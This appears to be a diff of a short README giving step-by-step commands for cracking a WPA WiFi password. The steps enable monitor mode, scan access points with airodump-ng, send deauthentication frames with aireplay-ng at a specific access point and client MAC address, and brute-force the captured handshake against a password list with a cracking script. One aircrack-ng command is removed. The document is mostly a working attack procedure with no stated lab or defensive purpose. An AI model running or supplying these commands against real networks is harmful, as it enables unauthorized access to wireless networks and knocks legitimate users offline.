@@ -1,3 +1,10 @@
+## Pre-requisits
+install airodump-ng
+have a netword card with monitor mode support
+
+## 0. Enable monitor mode
+./enable-monitor.sh
+
 ## 1. Scan available access points
 sudo airodump-ng -w scan-aps wlp1s0mon
 ## 2. Extract all APs with their MAC address and channels
@@ -13,5 +20,3 @@ sudo aireplay-ng --deauth 10 -a e8:48:b8:f0:0f:9c -c 52:62:E7:6C:26:C2 wlp1s0mon
 ## 7. Brute-force password and match
 python3 wpa_cracker.py do-deauth-02.cap passlist.txt
 
-
-aircrack-ng -w smartlist.txt -b e8:48:b8:f0:0f:9c --debug do-deauth-05.cap
